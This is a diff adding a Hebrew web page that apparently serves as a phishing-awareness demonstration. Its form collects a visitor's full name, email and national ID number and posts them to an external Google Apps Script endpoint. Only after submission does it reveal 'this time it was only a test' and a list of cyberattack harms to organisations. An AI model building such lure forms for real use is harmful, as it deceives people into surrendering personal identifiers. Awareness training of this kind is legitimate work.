@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>נזקי סייבר על ארגונים</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            color: black;
+            direction: rtl;
+        }
+        /* סגנון לדף מילוי הפרטים */
+        .form-container {
+            background-color: #e0f7fa; /* רקע תכלת נעים */
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: 50px auto;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #00796b;
+            border-radius: 5px;
+        }
+        .form-container button {
+            background: #00796b;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+        .form-container button:hover {
+            background: #004d40;
+        }
+        /* סגנון לדף תוכן */
+        #main-content {
+            display: none; /* התוכן הראשי מוסתר בתחילה */
+            background-image: url('https://mahalooz.co.il/wp-content/uploads/2024/05/html-css-collage-concept-with-hacker.jpg'); /* הקישור שלך */
+            background-size: cover;
+            background-position: center;
+            padding: 20px;
+            color: white;
+        }
+        h1 {
+            color: #00ffcc;
+            text-align: center;
+        }
+        h2 {
+            color: #ffcc00;
+            text-shadow: 1px 1px 6px rgba(0, 0, 0, 0.5);
+        }
+        p {
+            font-size: 18px;
+            text-shadow: 1px 1px 6px rgba(0, 0, 0, 0.5);
+        }
+        .warning {
+            color: #ff4747;
+            text-align: center;
+            font-size: 22px;
+            margin: 20px 0;
+            border: 1px solid #ff4747;
+            padding: 15px;
+            border-radius: 5px;
+            background-color: rgba(255, 71, 71, 0.3);
+            animation: blink 1s infinite; /* אפקט מהבהב */
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #b0c4de;
+        }
+    </style>
+    <script>
+        function showContent() {
+            // מחביא את טופס הפרטים
+            document.getElementById('form-container').style.display = 'none';
+            // מראה את התוכן הראשי
+            document.getElementById('main-content').style.display = 'block';
+        }
+    </script>
+</head>
+<body>
+    <div class="form-container" id="form-container">
+        <h2>נא למלא את פרטיך</h2>
+        <form id="dataForm" method="POST" action="https://script.google.com/macros/s/AKfycbxfuOXoMf_dFfJyN2OO8rwb2FIYd1nAFp8q04gTOENjtiOHJ9waSdHqzQ1vDwvvkseI/exec">
+            <input type="text" name="fullName" placeholder="שם מלא" required />
+            <input type="email" name="email" placeholder="כתובת מייל" required />
+            <input type="text" name="idNumber" placeholder="ת.ז" required />
+            <button type="submit" onclick="showContent()">שלח</button>
+        </form>
+    </div>
+    
+    <div id="main-content">
+        <div class="warning">הפעם זאת הייתה רק בדיקה</div>
+        <h1>נזקי מתקפות סייבר על ארגונים</h1>
+        <p>מתקפות סייבר עלולות לגרום לנזקים משמעותיים לארגונים. להלן כמה מהנזקים הנפוצים:</p>
+        <ul>
+            <li>
+                <h2>אובדן מידע</h2>
+                <p>נתונים חשובים עלולים להימחק או להיגנב, מה שעלול להוביל לנזק חמור לפעילות הארגון.</p>
+            </li>
+            <li>
+                <h2>פגיעה בפרטיות</h2>
+                <p>חשיפת מידע אישי של לקוחות ועובדים יכולה לפגוע באמון הציבור ובתמונת הארגון.</p>
+            </li>
+            <li>
+                <h2>נזק כספי</h2>
+                <p>הוצאות גבוהות על תיקון החולשות, החזרת המידע והגנה עתידית על המידע.</p>
+            </li>
+            <li>
+                <h2>פגיעה במוניטין</h2>
+                <p>אובדן אמון מצד לקוחות שיכול להוביל לירידה במכירות ולפגיעה חמורה במותג.</p>
+            </li>
+            <li>
+                <h2>עלויות התאוששות</h2>
+                <p>תהליך ההתאוששות דורש צוותים מקצועיים ומשאבים נוספים, מה שיכול להכביד על התקציב.</p>
+            </li>
+        </ul>
+    </div>
+    <footer>
+        <p>&copy; 2025 כל הזכויות שמורות</p>
+    </footer>
+</body>
+</html>
